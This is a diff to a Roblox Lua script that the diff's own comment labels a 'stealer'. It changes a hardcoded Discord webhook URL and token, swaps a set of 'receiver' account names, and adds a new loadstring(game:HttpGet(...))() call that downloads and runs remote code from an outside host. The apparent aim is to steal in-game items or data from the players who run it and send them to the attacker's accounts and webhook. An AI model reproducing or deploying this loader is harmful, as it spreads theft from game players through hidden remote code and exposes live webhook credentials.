@@ -1,6 +1,9 @@
-WEBHOOK = "https://discord.com/api/webhooks/1425905046343782442/Y3nXrE9E6wmq39_co1AXYqX-w1vVPmN-F4_f3cIb9l96_qD7BgTb6FE7rcJC8qWp3_Iw"
-‎RECEIVERS = {"Yashstorage", "Yashstorage1", "Yashstorage2", "YashStorage3", "YashStorage4", "YashStorage5"}
-‎MONEY_PER_SECOND = 500000 -- DEFAULT: 300000/s
-‎DMG_PER_SECOND = 500000 -- DEFAULT: 300000/s
+-- V2.1: stealer + loading screen + server hop for ps 
 ‎
-‎loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/5af52aaa2f3e0118d73d35f30686cc05b7680eaa3e0133db08d9a5a2b9db3d5d/download"))()
+‎getgenv().WEBHOOK = "https://discord.com/api/webhooks/1430458936418369607/uGeysRsMYFvUCi7cmLNwxDD61SLQ8_Ci14toYnc07CSR9QpwKXRC4dD-wYb-8CdqEfrL"
+‎getgenv().RECEIVERS = {"YashStorage", "YashStorage1", "YASHURA_Cion", "YashStorage2", "YashStorage3"}
+‎getgenv().MONEY_PER_SECOND = 500000 -- DEFAULT: 100000/s
+‎getgenv().DMG_PER_SECOND = 500000 -- DEFAULT: 100000/s
+‎
+‎
+‎loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/af28bcaaab24d45dae37ee66caab0c46ebe174087959085e88dee2d297fd6537/download"))()
